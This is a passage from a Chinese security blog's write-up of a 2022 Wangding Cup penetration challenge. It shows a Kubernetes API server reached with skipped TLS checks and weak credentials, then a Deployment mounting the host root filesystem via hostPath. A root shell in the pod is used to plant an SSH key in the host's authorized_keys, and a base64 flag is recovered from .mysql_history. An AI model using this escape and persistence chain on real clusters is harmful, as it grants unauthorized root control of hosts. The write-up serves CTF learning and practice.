class="hljs-string">&quot;/readyz/shutdown&quot;</span>,<br>    <span class="hljs-string">&quot;/version&quot;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\tools&gt; kubectl <span class="hljs-literal">--insecure-skip-tls-verify</span> <span class="hljs-literal">-s</span> https://<span class="hljs-number">172.22</span>.<span class="hljs-number">14.37</span>:<span class="hljs-number">6443</span>/ get pods<br>Please enter Username: test<br>Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE<br>nginx<span class="hljs-literal">-deployment-864f8bfd6f-697jq</span>   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">61</span>s<br></code></pre></td></tr></table></figure>
+<p>写一个yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-deployment</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.8</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/mnt</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>      <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>        <span class="hljs-attr">hostPath:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\tools&gt; kubectl.exe <span class="hljs-literal">--insecure-skip-tls-verify</span> <span class="hljs-literal">-s</span> https://<span class="hljs-number">172.22</span>.<span class="hljs-number">14.37</span>:<span class="hljs-number">6443</span>/ apply <span class="hljs-operator">-f</span> aaa.yaml<br>Please enter Username: test<br>Please enter Password: deployment.apps/nginx<span class="hljs-literal">-deployment</span> configured<br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\tools&gt; kubectl.exe <span class="hljs-literal">--insecure-skip-tls-verify</span> <span class="hljs-literal">-s</span> https://<span class="hljs-number">172.22</span>.<span class="hljs-number">14.37</span>:<span class="hljs-number">6443</span>/ exec <span class="hljs-literal">-it</span> nginx<span class="hljs-literal">-deployment-864f8bfd6f-697jq</span> /bin/bash<br>kubectl exec [<span class="hljs-type">POD</span>] [<span class="hljs-type">COMMAND</span>] is DEPRECATED and will be removed <span class="hljs-keyword">in</span> a future version. Use kubectl exec [<span class="hljs-type">POD</span>] <span class="hljs-literal">--</span> [<span class="hljs-type">COMMAND</span>] instead.<br>Please enter Username: test<br>root@nginx<span class="hljs-literal">-deployment-864f8bfd6f-697jq</span>:/<span class="hljs-comment"># ls</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">root@nginx<span class="hljs-literal">-deployment-864f8bfd6f-697jq</span>:/<span class="hljs-comment"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure>
+<p>写个ssh进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs poowershell">root@nginx-deployment-864f8bfd6f-697jq:/# echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQ................................ root@kali&#x27; &gt; /mnt/root/.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19174705.png" srcset="/img/loading.gif" lazyload alt="2025-05-19174705"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-k8s:~# <span class="hljs-built_in">ls</span> -al<br>total 56<br>drwx------  8 root root 4096 Mar 17 16:32 .<br>drwxr-xr-x 22 root root 4096 May 19 16:21 ..<br>lrwxrwxrwx  1 root root    9 Mar 17 16:32 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc<br>drwx------  3 root root 4096 Jul 18  2023 .cache<br>drwx------  3 root root 4096 Jul 18  2023 .gnupg<br>drwxr-xr-x  4 root root 4096 Mar 17 15:53 .kube<br>drwxr-xr-x 14 root root 4096 Mar 17 15:49 metarget<br>-rw-------  1 root root 1136 Mar 25  2024 .mysql_history<br>-rw-r--r--  1 root root  295 Mar 17 16:11 nginx-deployment.yaml<br>drwxr-xr-x  2 root root 4096 Jul 18  2023 .pip<br>-rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>-rw-r--r--  1 root root  206 May 19 16:21 .pydistutils.cfg<br>-rw-------  1 root root    7 Mar 17 15:47 .python_history<br>drwx------  2 root root 4096 Jul 18  2023 .ssh<br></code></pre></td></tr></table></figure>
+<p>查看一下内容得到了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-k8s:~# <span class="hljs-built_in">cat</span> .mysql_history<br>_HiStOrY_V2_<br>show\040databases;<br>create\040database\040flaghaha;<br>use\040flaghaha<br>DROP\040TABLE\040IF\040EXISTS\040`f1ag`;<br>CREATE\040TABLE\040`flag06`\040(<br>`<span class="hljs-built_in">id</span>`\040int\040DEFAULT\040NULL,<br>\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL<br>)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;<br>CREATE\040TABLE\040`flag06`\040(\040`<span class="hljs-built_in">id</span>`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;<br>show\040tables;<br>drop\040table\040flag06;<br>DROP\040TABLE\040IF\040EXISTS\040`f1ag`;<br>CREATE\040TABLE\040`flag04`\040(<br>`<span class="hljs-built_in">id</span>`\040int\040DEFAULT\040NULL,<br>\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL<br>)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;<br>CREATE\040TABLE\040`flag04`\040(\040`<span class="hljs-built_in">id</span>`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;<br>INSERT\040INTO\040`flag`\040VALUES\040(1,\040<span class="hljs-string">&#x27;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#x27;</span>);<br>INSERT\040INTO\040`flag04`\040VALUES\040(1,\040<span class="hljs-string">&#x27;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#x27;</span>);<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+<p>解码一下得到flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;da69c459-<span class="hljs-number">7</span>fe5-<span class="hljs-number">4535</span>-b8d1-<span class="hljs-number">15</span>fff496a29f&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="print-no-link">#横向移动</a>
+      
+        <a href="/tags/thinkphp/" class="print-no-link">#thinkphp</a>
+      
+        <a href="/tags/shiro/" class="print-no-link">#shiro</a>
+      
+        <a href="/tags/k8s/" class="print-no-link">#k8s</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>网鼎杯2022半决赛复现</div>
+      <div>https://0ran9ewww.github.io/2025/05/19/渗透/GreatWall/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年5月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/01/%E6%B8%97%E9%80%8F/wdb2022/" title="网鼎杯2022半决赛复现">
+                        <span class="hidden-mobile">网鼎杯2022半决赛复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
